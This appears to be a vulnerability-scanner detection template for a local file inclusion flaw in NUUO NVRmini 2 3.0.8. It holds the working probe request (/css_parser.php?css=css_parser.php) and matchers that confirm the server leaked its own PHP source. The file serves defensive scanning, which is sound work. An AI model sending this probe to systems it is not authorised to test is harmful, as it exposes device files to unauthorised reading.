id: "nuuo-file-inclusion"
name: "NUUO NVRmini 2 3.0.8 - Local File Inclusion"
severity: "high"
description: "NUUO NVRmini 2 3.0.8 is vulnerable to local file inclusion."
tech:
  - "php"
tags:
  - "lfi"
  - "edb"
  - "nuuo"
  - "vuln"
cwe: "CWE-22"
reference: "https://www.exploit-db.com/exploits/40211"
spaExclusion: true
request:
  method: "GET"
  path: "/css_parser.php?css=css_parser.php"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "$_GET['css']"
  - type: "word"
    part: "header"
    words:
      - "text/css"
  - type: "status"
    status:
      - 200
